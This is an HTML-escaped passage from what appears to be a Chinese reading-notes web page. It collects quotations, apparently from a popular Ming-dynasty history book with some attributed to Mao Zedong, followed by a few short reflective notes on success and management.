admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;从道士到钢铁战士，只是因为一件东西——信仰。在这个世界上，信仰是最为坚固的物体，一旦坚持，就很难动摇，而金钱、美色在它的面前，是极为软弱无力的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;原来人生可以如同地狱一般。在看过了无数百姓沿街乞讨、卖儿卖女，只求能够多吃一顿、多活一天的惨象后，张居正发出了这样的长叹。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所以我相信，即使这个世界十分阴晦、十分邪恶，即使它让你痛不欲生、生不如死，但依然应该鼓起勇气，勇敢地活下去。所以我相信，希望是不会死去的。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在封建时代，就做封建时代的事，说封建时代的话，别指望人家有多高的觉悟，这就叫历史唯物主义。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这个世界上，所有存在的东西，必有其合理性，否则它就绝不会诞生。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;把所有不服你的人都打服，敢出声就灭了他，所有人都认你当大哥，这就叫实现团结。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;没有无缘无故的爱，也没有无缘无故的恨，原来如此。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我知道，我有极为坚强的意志，我的斗志不会衰竭，我的心志不会动摇，即使与全天下人为敌，我也决不妥协。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所有的英雄，都是平凡的人。千回百转，千锤百炼，矢志不改，如此而已。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;你还很年轻，将来你会遇到很多人，经历很多事，得到很多，也会失去很多，但无论如何，有两样东西，你绝不能丢弃，一个叫良心，另一个叫理想。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;在这个世界上，笨人的第一特征，就是自认为聪明。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;义武奋扬，跳梁者，虽强必戮！&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;临战之时，国仇家恨，慷慨激昂，大家都激动。在这个时候，跟着激动一把，可谓是毫无成本，反正仗也不用自己打，还能落个爱国的名声，何乐而不为？&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;许多你曾无比熟悉的人，其实十分陌生；许多你曾坚信的事实，其实十分虚伪；而这，只不过是个开头。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;很多人说过，最好的老师，不是特级教师，不是名牌学校，而是兴趣。但我要告诉你，这个答案是错误的。在这个世界上，最优秀的老师，是生存。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;纯粹的人，是这个世界上最可怕的人。他们的一生，往往只有一个目标。为了达到这个目标，他们可以不择手段，不顾一切；他们无法被收买，无法被威逼，他们不要钱，不要女色，甚至不要权势和名声。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;无论搞多少次普法教育，都是没用的，只要让大家都去监狱住两天，亲自实践，就不会再犯罪了。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;政治的最高技巧，不是你死我活，而是妥协。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;只有岁月的沧桑，才能淘尽一切污浊，扫清人们眼帘上的遮盖与灰尘，看到那些殉道者无比璀璨的光芒，历千年而不灭。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人应该坚持信念，至死也不动摇。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;不要以为渺小的，就没有力量；不要以为卑微的，就没有尊严。弱者和强者之间唯一的差别，只在信念是否坚定。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们的同志在困难的时候，要看到成绩，要看到光明，要提高我们的勇气。&#xA;——毛泽东&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;军队应该具有一往无前的精神，它要压倒一切敌人，而决不被敌人所屈服。不论在任何艰难困苦的场合，只要还有一个人，这个人就要继续战斗下去。&#xA;——毛泽东&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;只要你不放弃自己，上天就不会放弃你。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;张牙舞爪的人，往往是脆弱的，因为真正强大的人，是自信的，自信就会温和，温和就会坚定。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们之所以一直这样认为，只是因为有人这样告诉我们。之所以有人这样告诉我们，是因为他们希望我们这样认为。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;其实很多时候，群众是好说话的，因为他们所需要的并非特权，而是公平。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;《中庸》有云：&#xA;“国有道，不变塞焉，国无道，至死不变。”&#xA;无论这个世界多么混乱，坚持自己的信念。&#xA;我钦佩这样的人。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所谓历史，就是过去的事，它的残酷之处在于：无论你哀号、悲伤、痛苦、流泪、落寞、追悔，它都无法改变。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人只活一辈子，如何生活，都是自己的事，自己这辈子浑浑噩噩地没活好，厚着脸皮还来指责别人，有多远，就去滚多远。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“男儿志在四方，当往天地间一展胸怀！”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;其实这个世上很多事，本不需要理由，之所以需要理由，是因为很多人喜欢找抽，抽久了，就需要理由了。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;因为我要告诉你，所谓千秋霸业，万古流芳，以及一切的一切，只是粪土。先变成粪，再变成土。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;成功只有一个——按照自己的方式，去度过人生。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;他人批注&#34;&gt;&lt;span&gt;他人批注&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e4%bb%96%e4%ba%ba%e6%89%b9%e6%b3%a8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;成功学之所以是谬论，是由于当你成功时，说什么都会变为有价值的学问，无论真假，总有人相信。世界可以有完美的人设，但是没有完美的人生。每个人只是在有限的时间，用有限的认知作出了自认为最正确的选择，而这一切的结果都指向未知。&#xA;多年之后回首，回到当年命运的选择路口，你会选择不一样的路途么？另外一条路途会成就一个与现在截然不同的自己么？不一定的。那么时常把过往和后悔挂在嘴边，就是完全没有意义，苍白且无力的辩解。每个人可以抓住的，只有当下的日拱一卒。结果，留给时间评判。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;以利相交，利尽则散，以权相交，权失则弃。以色相交，色衰爱弛。言传身教、以身作则，是作为管理者的首要法则。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;br&gt;&#xD;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    